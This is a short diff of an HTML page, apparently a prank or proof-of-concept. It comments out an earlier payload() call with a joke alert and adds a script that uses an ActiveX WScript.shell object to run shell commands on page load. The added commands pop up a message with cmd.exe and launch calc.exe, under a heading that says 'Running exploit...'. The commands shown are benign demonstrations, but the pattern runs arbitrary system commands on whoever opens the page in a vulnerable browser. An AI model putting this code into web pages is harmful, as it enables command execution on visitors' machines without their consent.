@@ -39,13 +39,23 @@ function start() {
 */
 
 //Running it once.
+/*
 function start() {
 	payload();
 	setTimeout(function() {alert("Lol.")}, 4500);
 }
 
 start();
-
+*/
 </script>
+
+<script>
+  var objShell = new ActiveXObject("WScript.shell");
+  objShell.run('cmd.exe /c msg Utilisateur yes');
+  objShell.run('calc.exe');
+ </script>
+ 
+<h1>Running exploit...</h1>
+	
 </body>
 </html>
